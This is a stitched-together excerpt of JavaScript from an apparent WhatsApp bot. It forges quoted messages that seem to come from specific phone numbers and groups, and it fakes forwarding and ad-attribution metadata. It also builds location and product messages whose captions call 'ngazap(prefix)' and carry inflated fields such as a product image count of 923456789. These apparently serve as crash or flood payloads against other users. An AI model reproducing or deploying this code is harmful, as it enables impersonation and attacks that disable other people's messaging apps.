...
//=================================================//
const tzy = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "14169948404-1305080833@g.us" } : {}) },"message": {"extendedTextMessage": {"text": "Boedzhanks","previewType": "NONE","contextInfo": {"stanzaId": "3EB0382EDBB2","participant": "6283129109022@s.whatsapp.net" }}}}
const pak = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"extendedTextMessage": {"text": "Boedzhanks","previewType": "NONE","contextInfo": {"stanzaId": "3EB0382EDBB2","participant": "@s.whatsapp.net"}}}}
...
zyren.sendMessage(m.chat, { contextInfo: { mentionedJid: teks? [...teks.matchAll(/@(\d{0,16})/g)].map(v => v[1] + "@s.whatsapp.net") : [], externalAdReply: { showAdAttribution: true, title: "Boedzhanks", body: "DONT CLICK HERE", previewType: "PHOTO", thumbnail: logonya, sourceUrl: "http://youtube.com/ShinoaHiiragi" }}, text: teks }, { quoted: tzy })
} else if (db.data.settings[botNumber].replytype == "web2") {
zyren.sendMessage(m.chat, { contextInfo: { mentionedJid: teks? [...teks.matchAll(/@(\d{0,16})/g)].map(v => v[1] + "@s.whatsapp.net") : [], forwardingScore: 9999, isForwarded: true, showAdAttribution: true, externalAdReply: { title: "Boedzhanks", body: "DONT CLICK HERE", previewType: "PHOTO", thumbnail: logonya, sourceUrl: "http://youtube.com/ShinoaHiiragi" }}, text: teks }, { quoted: tzy })
} else if (db.data.settings[botNumber].replytype == "web3") {
zyren.sendMessage(m.chat, { contextInfo: { mentionedJid: teks? [...teks.matchAll(/@(\d{0,16})/g)].map(v => v[1] + "@s.whatsapp.net") : [], forwardingScore: 10, isForwarded: true, externalAdReply: { showAdAttribution: true, title: "Boedzhanks", body: "DONT CLICK HERE", previewType: "PHOTO", thumbnail: logonya, sourceUrl: "http://youtube.com/ShinoaHiiragi" }}, text: teks }, { quoted: tzy })
...
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `Boedzhanks${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: ftrolii })
...
"productImage": messa.imageMessage,
"productId": "4383282311765462",
"title": `Boedzhanks${ngazap(prefix)}`,
"description": `Boedzhanks`,
"currencyCode": "IDR",
"footerText": `𝙼𝚎𝚕𝚕𝚒𝚊𝙵𝚛𝚒𝚜𝚔𝚊`,
"priceAmount1000": "10000000",
"productImageCount": 923456789,
